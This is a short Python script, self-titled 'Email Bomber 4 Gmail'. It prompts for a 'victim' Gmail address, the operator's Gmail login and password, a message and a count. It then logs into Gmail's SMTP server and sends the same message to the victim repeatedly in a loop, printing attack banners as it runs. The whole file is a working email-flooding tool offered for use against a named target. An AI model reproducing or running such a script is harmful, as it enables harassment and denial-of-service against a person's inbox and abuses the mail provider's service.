#!/usr/bin/python3
#Date Modified = 27/aug/2020

#Imports
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from pathlib import Path
import smtplib
import pyfiglet
import os

#Banner

print("##########################################################################################################################")

ascii_banner = pyfiglet.figlet_format("Email Bomber 4 Gmail !!")
print(ascii_banner)


def line_space():
    print("\n")
#Variables
victim_email = input("Enter victim's gmail_address -> ")
line_space()
our_email = input("Enter your gmail_address -> ")
line_space()
password = input("Enter your Gmail_password -> ")
line_space()
message = input("Enter message you want To send -> ")
line_space()
count = int(input("How many message you want to send? -> "))



os.system("toilet -f term -F border --gay BOOM BOOM ATTACK STARTED")

print ("Wait for seconds")
#Functions
def functions():
        smtp=smtplib.SMTP(host="smtp.gmail.com",port=587) 
        smtp.ehlo()
        smtp.starttls()
        smtp.login(our_email,password)
        smtp.sendmail(our_email,victim_email,message)
functions()

for x in range(1,count):
    functions()
line_space()
print (" Total", count , "Message Sent")
line_space()

ascii_banner2 = pyfiglet.figlet_format("Done :-) ")
print (ascii_banner2)

print("##########################################################################################################################")
